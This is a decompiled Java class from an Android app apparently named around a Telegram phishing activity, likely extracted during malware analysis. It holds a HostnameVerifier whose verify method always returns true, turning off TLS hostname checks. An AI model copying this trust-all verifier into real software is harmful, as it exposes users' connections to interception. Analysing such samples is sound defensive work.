package com.base.template;

import com.base.template.network.WsPersistManager;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLSession;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final /* synthetic */ class TelegramPhishActivity$$ExternalSyntheticLambda0 implements HostnameVerifier {
    public final /* synthetic */ int $r8$classId;

    @Override // javax.net.ssl.HostnameVerifier
    public final boolean verify(String str, SSLSession sSLSession) {
        switch (this.$r8$classId) {
            case 0:
                int i = TelegramPhishActivity.$r8$clinit;
                return true;
            default:
                Object obj = WsPersistManager.lock;
            case 1:
                return true;
        }
    }
}
